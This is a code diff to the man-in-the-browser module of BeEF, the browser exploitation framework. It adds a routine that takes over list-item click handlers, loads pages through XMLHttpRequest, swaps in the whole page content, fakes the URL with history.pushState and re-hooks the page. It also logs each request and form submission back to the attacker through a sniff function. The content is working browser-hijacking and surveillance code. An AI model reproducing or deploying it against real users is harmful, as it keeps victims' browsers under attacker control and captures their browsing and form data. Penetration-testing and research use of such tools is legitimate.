@@ -105,11 +105,23 @@ beef.mitb = {
 
         var anchors = document.getElementsByTagName("a");
         var forms = document.getElementsByTagName("form");
+        var lis = document.getElementsByTagName("li");
+
         for (var i = 0; i < anchors.length; i++) {
             anchors[i].onclick = beef.mitb.poisonAnchor;
         }
         for (var i = 0; i < forms.length; i++) {
             beef.mitb.poisonForm(forms[i]);
+        }
+
+        for (var i = 0; i < lis.length; i++) {
+            if (lis[i].hasAttribute("onclick")) {
+                lis[i].removeAttribute("onclick");
+                /*clear*/
+                lis[i].setAttribute("onclick", "beef.mitb.fetchOnclick('" + lis[i].getElementsByTagName("a")[0] + "')");
+                /*override*/
+
+            }
         }
     },
 
@@ -167,7 +179,7 @@ beef.mitb = {
                 }
             }
             y.send(query);
-            beef.mitb.sniff("POST: " + url + " [" + query + "]");
+            beef.mitb.sniff("POST: " + url + "[" + query + "]");
             return true;
         } catch (x) {
             return false;
@@ -193,6 +205,38 @@ beef.mitb = {
             window.open(url);
             beef.mitb.sniff("GET [New Window]: " + url);
             return false;
+        }
+    },
+
+    // Fetches a window.location=http://something and setting up history
+    fetchOnclick:function (url) {
+        try {
+            var target = document.getElementsByTagName("html")[0];
+            var y = new XMLHttpRequest();
+            y.open('GET', url, false, "beef", "beef");
+            y.onreadystatechange = function () {
+                if (y.readyState == 4 && y.responseText != "") {
+                    var title = "";
+                    if (document.getElementsByTagName("title").length == 0) {
+                        title = document.title;
+                    }
+                    else {
+                        title = document.getElementsByTagName("title")[0].innerHTML;
+                        }
+                    history.pushState({ Be:"EF" }, title, url);
+                    target.innerHTML = y.responseText;
+                    setTimeout(beef.mitb.hook, 10);
+                }
+            }
+            y.send(null);
+            beef.mitb.sniff("GET: " + url);
+
+        } catch (x) {
+
+
+            window.open(url);
+            beef.mitb.sniff("GET [New Window]: " + url);
+
         }
     },
 
